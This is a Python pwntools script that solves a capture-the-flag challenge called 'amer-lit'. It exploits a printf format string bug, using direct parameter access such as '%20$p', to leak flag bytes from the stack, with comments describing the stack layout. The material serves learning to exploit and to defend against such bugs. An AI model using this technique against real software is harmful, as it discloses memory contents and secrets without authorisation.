from pwn import *
import struct

#p = remote('bin.bcactf.com', 49155)
p = process('./amer-lit')

e = ELF('./amer-lit')

## Read until the prompt
p.readuntil('essay.\n')

'''
Other local variables
....
essay_length    {Frame offset -0xc4}
FILE *          {Frame offset -0xc0}        Flag file *
essay           {Frame offset -0xb8}        Format string
example_essay   {Frame offset -0x78}        Contains the flag
cookie          {Frame offset -0x0c}
saved_rbp       {Frame offset -0x08}
return_address  {Frame offset  0x00}
'''

'''
The bug is at the line with:
    printf(essay)

It allows us to exploit it via a format string bug. Since the data from the flag is on the stack
we can use this to print it out. After some trial and error I found the flag data beginning at the 20th quadword.

So, using direct parameter access it was easy to print out
'''

response = '%20$p.%21$p.%22$p.%23$p.\n'

p.send(response)

p.readuntil('0x')

data = p.readline().split(b'.')

flag = struct.pack('Q', int(data[0], 16))
flag += struct.pack('Q', int(data[1], 16))
flag += struct.pack('Q', int(data[2], 16))
flag += struct.pack('Q', int(data[3], 16))

print('Flag: ', flag)

p.close()

